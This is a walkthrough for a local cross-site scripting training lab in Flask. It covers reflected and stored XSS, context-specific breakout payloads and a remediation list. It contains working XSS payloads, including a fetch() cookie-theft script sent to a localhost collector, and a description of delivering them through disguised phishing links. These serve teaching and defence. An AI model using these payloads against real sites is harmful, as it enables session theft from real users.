# XSS Training Lab — Walkthrough

Local-only lab. Everything, including the "attacker" cookie collector, runs
on `127.0.0.1`. Nothing here should ever be pointed at a real user or public
server.

## Setup

```
cd xss-lab
pip install flask --break-system-packages   # if not already installed
python3 app.py
```

Open http://127.0.0.1:5000/

---

## Part 1 — Reflected XSS (`/search`)

### Root cause
`request.args.get("q")` is dropped straight into the HTML response and the
template marks it `|safe`, which turns off Jinja2's default output encoding.
The browser can't tell attacker-supplied HTML from page markup, so it
renders whatever it's given — the vulnerability is entirely about **missing
output encoding at the point of insertion**, not about the input itself.

### Basic proof of concept
```
http://127.0.0.1:5000/search?q=<script>alert(document.domain)</script>
```
This confirms arbitrary JS execution in the victim's browser, in the site's
own origin.

### Cookie theft payload
The lab sets a non-HttpOnly `session_id` cookie so you can see this end to
end. Point the payload at the local collector instead of a real server:
```
http://127.0.0.1:5000/search?q=<script>fetch('http://127.0.0.1:5000/collector?data='+document.cookie)</script>
```
Then check http://127.0.0.1:5000/collector/log — you'll see the stolen
`session_id` value logged, exactly as an attacker's server would receive it.

### Phishing delivery
Reflected XSS only fires when the victim visits a URL carrying the payload,
so real-world delivery is via a crafted link sent through email, chat, or a
malicious ad — often shortened or disguised to hide the query string, e.g.
`https://bit.ly/3xyzABC` redirecting to the vulnerable URL. The victim clicks,
the page loads normally, the script runs invisibly, and their cookie is sent
to the attacker. This is why reflected XSS is sometimes called "non-persistent
but socially engineered" — it needs one successful click, not ongoing access
to the target site.

### Context changes the payload
The same unsanitized variable can sit in different places in the HTML, and
each needs a different escape technique to break out of:

| Context | Example sink | Payload shape |
|---|---|---|
| HTML body | `<p>{{q}}</p>` | `<script>...</script>` or `<img src=x onerror=...>` |
| HTML attribute | `<input value="{{q}}">` | `" autofocus onfocus=alert(1) x="` (close the attribute first) |
| JS string context | `<script>var x = "{{q}}";</script>` | `";alert(1);//` (close the string and statement) |
| URL/href context | `<a href="{{q}}">` | `javascript:alert(1)` |

The takeaway: encoding has to match *where* the value lands. HTML-entity
encoding alone doesn't protect a value injected inside a `<script>` block or
inside an unquoted attribute — that's why frameworks provide
context-aware auto-escaping rather than one generic "sanitize" function.

Compare against `/search-safe`, where the same payloads render as inert text.

---

## Part 2 — Stored XSS + simulated session hijacking (`/guestbook`)

### Root cause
Guestbook `author`/`body` values are saved verbatim to SQLite and re-rendered
with `|safe` for every visitor. There's no encoding on the way in (no input
validation/allowlisting) and none on the way out (no escaping at render
time) — the second gap is the one that actually causes the vulnerability.

### Injecting the payload
Post this as a guestbook message body:
```
<script>fetch('http://127.0.0.1:5000/collector?data='+document.cookie)</script>
```
Reload `/guestbook` (or open it in a second browser/incognito window to
simulate "another user"). The script fires on every page load, and each
viewer's simulated `session_id` cookie gets sent to `/collector`, which you
can confirm at `/collector/log`.

### Reflected vs stored — persistence and blast radius
- **Reflected**: payload lives only in the request URL; it must be
  delivered fresh to each victim (a phishing link, a malicious redirect).
  Impact is limited to whoever clicks that specific link.
- **Stored**: payload is saved server-side and served to *every* visitor of
  the affected page with no further attacker action needed. One successful
  injection compounds — it can hit every existing user plus every future
  visitor until it's found and removed, which is why it's generally treated
  as higher severity.

### Remediation (applies to both)
1. **Output encoding at the render boundary** — the actual fix. Use your
   templating engine's default autoescaping (Jinja2, React JSX, etc. all do
   this by default) and never bypass it (`|safe`, `dangerouslySetInnerHTML`,
   `innerHTML =`) for user-controlled data.
2. **Context-aware encoding** — HTML-entity encode for HTML body, attribute-
   encode for attribute context, JS-string-escape for script context; don't
   assume one encoding style covers every sink.
3. **Input validation** as defense in depth — allowlist expected formats
   (e.g. reject `<`/`>` in a name field) — but never rely on this alone,
   since it's easy to miss an encoding edge case.
4. **Content-Security-Policy** — a `script-src` allowlist (see
   `/guestbook-safe`) stops injected `<script>` tags and inline handlers
   from executing even if an encoding bug slips through; use a nonce or
   hash-based policy rather than `'unsafe-inline'`.
5. **`HttpOnly` + `Secure` + `SameSite` on session cookies** — `HttpOnly`
   blocks exactly the `document.cookie` theft demonstrated here (JS can't
   read the cookie at all); it doesn't stop XSS but it does stop this
   specific payoff, which is why it's a standard defense-in-depth layer
   alongside encoding, not a substitute for it.
6. **Sanitize rich-text input with a real library** (e.g. DOMPurify) if you
   must allow some HTML formatting from users — hand-rolled blocklists
   (stripping `<script>` textually) are reliably bypassable.

Compare the vulnerable and fixed guestbook side by side — the fixed version
renders the exact same payload as literal, harmless text on the page.
